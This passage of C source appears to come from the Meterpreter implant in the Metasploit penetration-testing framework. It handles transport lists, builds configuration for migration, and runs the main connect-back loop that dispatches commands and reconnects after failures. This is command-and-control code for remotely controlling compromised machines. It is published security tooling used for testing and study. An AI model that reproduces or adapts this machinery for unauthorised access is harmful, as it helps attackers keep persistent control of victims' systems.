	if (remote->transport->next_transport == remote->transport) {
		remote->transport = NULL;
	}
	else {
		// if we're removing the current one we need to move the pointer to the
		// next one in the list.
		if (remote->transport == oldTransport) {
			remote->transport = remote->transport->next_transport;
		}

		oldTransport->prev_transport->next_transport = oldTransport->next_transport;
		oldTransport->next_transport->prev_transport = oldTransport->prev_transport;
	}

	oldTransport->transport_destroy(oldTransport);
}

static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports, LPDWORD parsedSize) {
	DWORD totalSize = 0;
	MetsrvTransportCommon* current = transports;

	// The first part of the transport is always the URL, if it's NULL, we are done.
	while (current->url[0] != 0) {
		DWORD size;
		if (create_transport(remote, current, &size) != NULL) {
			dprintf("[TRANS] transport created of size %u", size);
			totalSize += size;

			// go to the next transport based on the size of the existing one.
			current = (MetsrvTransportCommon*)((LPBYTE)current + size);
		}
		else {
			// This is not good
			return FALSE;
		}
	}

	// account for the last terminating NULL wchar
	*parsedSize = totalSize + sizeof(wchar_t);

	return TRUE;
}

/*!
 * @brief Create a configuration block from the given transport.
 * @param transport Transport data to create the configuration from.
 * @return config Pointer to the config block to write to.
 */
static void transport_write_tcp_config(Transport* transport, MetsrvTransportTcp* config) {
	if (transport && config) {
		config->common.comms_timeout = transport->timeouts.comms;
		config->common.retry_total = transport->timeouts.retry_total;
		config->common.retry_wait = transport->timeouts.retry_wait;
		strncpy(config->common.url, transport->url, URL_SIZE);
	}
}

static void config_create(Remote* remote, MetsrvConfig** config, LPDWORD size) {
	// This function is really only used for migration purposes.
	DWORD s = sizeof(MetsrvSession);
	MetsrvSession* sess = (MetsrvSession*)malloc(s);
	memset(sess, 0, s);

	dprintf("[CONFIG] preparing the configuration");

	// start by preparing the session.
	memcpy(sess->uuid, remote->orig_config->session.uuid, UUID_SIZE);
	sess->expiry = remote->sess_expiry_end - current_unix_timestamp();

	// TOOD: figure what we should be doing for POSIX here.
	sess->exit_func = 0;

	Transport* current = remote->transport;
	Transport* t = remote->transport;
	do {
		// extend memory appropriately
		DWORD neededSize = t->type == METERPRETER_TRANSPORT_SSL ? sizeof(MetsrvTransportTcp) : sizeof(MetsrvTransportHttp);

		dprintf("[CONFIG] Allocating %u bytes for %s transport, total of %u bytes", neededSize, t->type == METERPRETER_TRANSPORT_SSL ? "ssl" : "http/s", s);

		sess = (MetsrvSession*)realloc(sess, s + neededSize);

		// load up the transport specifics
		LPBYTE target = (LPBYTE)sess + s;

		memset(target, 0, neededSize);
		s += neededSize;

		if (t->type == METERPRETER_TRANSPORT_SSL) {
			transport_write_tcp_config(t, (MetsrvTransportTcp*)target);
			dprintf("[CONFIG] TCP Comms Timeout: %d", ((MetsrvTransportTcp*)target)->common.comms_timeout);
			dprintf("[CONFIG] TCP Retry Total: %d", ((MetsrvTransportTcp*)target)->common.retry_total);
			dprintf("[CONFIG] TCP Retry Wait: %d", ((MetsrvTransportTcp*)target)->common.retry_wait);
			dprintf("[CONFIG] TCP URL: %s", ((MetsrvTransportTcp*)target)->common.url);

			// if the current transport is TCP, copy the socket fd over so that migration can use it.
			if (t == current) {
				sess->comms_fd = (DWORD)t->get_socket(t);
			}
		}

		t = t->next_transport;
	} while (t != current);

	// account for the last terminating NULL wchar so that the target knows the list has reached the end,
	// as well as the end of the extensions list. We may support wiring up existing extensions later on.
	DWORD terminatorSize = sizeof(wchar_t) + sizeof(DWORD);
	sess = (MetsrvSession*)realloc(sess, s + terminatorSize);
	memset((LPBYTE)sess + s, 0, terminatorSize);
	s += terminatorSize;

	// hand off the data
	dprintf("[CONFIG] Total of %u bytes located at 0x%p", s, sess);
	*size = s;
	*config = (MetsrvConfig*)sess;
}

/*!
 * @brief Setup and run the server. This is called from Init via the loader.
 * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
 * @return Meterpreter exit code (ignored by the caller).
 */
DWORD server_setup(MetsrvConfig* config)
{
	THREAD * serverThread = NULL;
	Remote *remote = NULL;
	char cStationName[256] = { 0 };
	char cDesktopName[256] = { 0 };
	DWORD res = 0;

	dprintf("[SERVER] Initializing...");
	int local_error = 0;

	dprintf("[SERVER] Initializing from configuration: 0x%p", config);
	dprintf("[SESSION] Comms Fd: %u", config->session.comms_fd);
	dprintf("[SESSION] Expiry: %u", config->session.expiry);

	srand(time(NULL));

	// Open a THREAD item for the servers main thread, we use this to manage migration later.
	serverThread = thread_open();
	dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X",
		serverThread->handle, serverThread->id, serverThread->sigterm);

	if (!(remote = remote_allocate())) {
		SetLastError(ERROR_NOT_ENOUGH_MEMORY);
		goto out;
	}

	remote->orig_config = config;
	remote->sess_expiry_time = config->session.expiry;
	remote->sess_start_time = current_unix_timestamp();
	remote->sess_expiry_end = remote->sess_start_time + config->session.expiry;

	remote->orig_config = config;
	remote->sess_expiry_time = config->session.expiry;
	remote->sess_start_time = current_unix_timestamp();
	remote->sess_expiry_end = remote->sess_start_time + config->session.expiry;

	dprintf("[DISPATCH] Session going for %u seconds from %u to %u", remote->sess_expiry_time, remote->sess_start_time, remote->sess_expiry_end);

	DWORD transportSize = 0;
	if (!create_transports(remote, config->transports, &transportSize)) {
		// not good, bail out!
		SetLastError(ERROR_INVALID_PARAMETER);
		goto out;
	}

	// the first transport should match the transport that we initially connected on.
	// If it's TCP comms, we need to wire that up.
	if (config->session.comms_fd) {
		((TcpTransportContext*)remote->transport->ctx)->fd = (SOCKET)config->session.comms_fd;
	}

	// TODO: need to implement this when we have the valid approach done for stageless.
	//load_stageless_extensions(remote, (MetsrvExtension*)((LPBYTE)config->transports + transportSize));

	// Set up the transport creation function pointer
	remote->trans_create = create_transport;
	// Set up the transport removal function pointer
	remote->trans_remove = remove_transport;
	// and the config creation pointer
	remote->config_create = config_create;

	// Store our thread handle
	remote->server_thread = serverThread->handle;

	dprintf("[SERVER] Registering dispatch routines...");
	register_dispatch_routines();

	remote->sess_start_time = current_unix_timestamp();

	// loop through the transports, reconnecting each time.
	while (remote->transport) {
		if (remote->transport->transport_init) {
			dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport);
			// Each transport has its own set of retry settings and each should honour
			// them individually.
			if (!remote->transport->transport_init(remote->transport)) {
				dprintf("[SERVER] transport initialisation failed, moving to the next transport");
				remote->transport = remote->transport->next_transport;

				// when we have a list of transports, we'll iterate to the next one.
				continue;
			}
		}

		dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
		DWORD dispatchResult = remote->transport->server_dispatch(remote, serverThread);

		dprintf("[DISPATCH] dispatch exited with result: %u", dispatchResult);
		if (remote->transport->transport_deinit) {
			dprintf("[DISPATCH] deinitialising transport");
			remote->transport->transport_deinit(remote->transport);
		}

		dprintf("[TRANS] resetting transport");
		if (remote->transport->transport_reset) {
			remote->transport->transport_reset(remote->transport, dispatchResult == ERROR_SUCCESS && remote->next_transport == NULL);
		}

		// If the transport mechanism failed, then we should loop until we're able to connect back again.
		if (dispatchResult == ERROR_SUCCESS) {
			dprintf("[DISPATCH] Server requested shutdown of dispatch");
			// But if it was successful, and this is a valid exit, then we should clean up and leave.
			if (remote->next_transport == NULL) {
				dprintf("[DISPATCH] No next transport specified, leaving");
				// we weren't asked to switch transports, so we exit.
				break;
			}

			// we need to change transports to the one we've been given. We will assume, for now,
			// that the transport has been created using the appropriate functions and that it is
			// part of the transport list.
			dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->next_transport);
			remote->transport = remote->next_transport;
			remote->next_transport = NULL;

			if (remote->next_transport_wait > 0) {
				dprintf("[TRANS] Sleeping for %u seconds ...", remote->next_transport_wait);
				sleep(remote->next_transport_wait);
				// the wait is a once-off thing, needs to be reset each time
				remote->next_transport_wait = 0;
			}
		}
		else {
			// move to the next one in the list
			dprintf("[TRANS] Moving transport from 0x%p to 0x%p", remote->transport, remote->transport->next_transport);
			remote->transport = remote->transport->next_transport;
		}
	}

	// clean up the transports
	while (remote->transport)
	{
		remove_transport(remote, remote->transport);
	}

	dprintf("[SERVER] Deregistering dispatch routines...");
	deregister_dispatch_routines(remote);

	remote_deallocate(remote);

out:
	res = GetLastError();

	dprintf("[SERVER] Finished.");
	return res == ERROR_SUCCESS;
}
